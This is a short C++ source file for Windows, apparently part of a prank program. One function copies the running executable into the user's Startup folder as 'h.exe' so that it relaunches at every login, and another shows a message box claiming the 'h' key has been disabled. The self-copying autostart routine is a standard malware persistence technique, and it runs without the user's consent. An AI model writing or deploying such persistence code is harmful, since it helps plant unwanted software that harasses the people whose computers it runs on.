#include "define.h"

static void autoStart() {
	// C:\Users\speep\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
	std::string trPathString;
	char szPath[MAX_PATH];
	PSTR lpFilename;
	// retrieve path for current module (szPath)
	GetModuleFileName(NULL, szPath, sizeof szPath);

	// pointer to filename part of the string containing the full path
	lpFilename = (strrchr(szPath, '\\') + 1);

	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::string s(username);

	trPathString = "C:\\Users\\" + s + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h.exe";
	char* trPath = const_cast<char*>(trPathString.c_str());

	std::ifstream src(szPath, std::ios::binary);
	std::ofstream dest(trPath, std::ios::binary);
	dest << src.rdbuf();

	//printf(trPath);
	//printf(szPath);
}

static void sendWarningMessage() {
	int msgboxID = MessageBox(
		NULL,
		(LPCTSTR)"The 'h' key has been disabled on this computer.",
		(LPCTSTR)"Warning",
		MB_ICONWARNING | MB_OK
	);
}
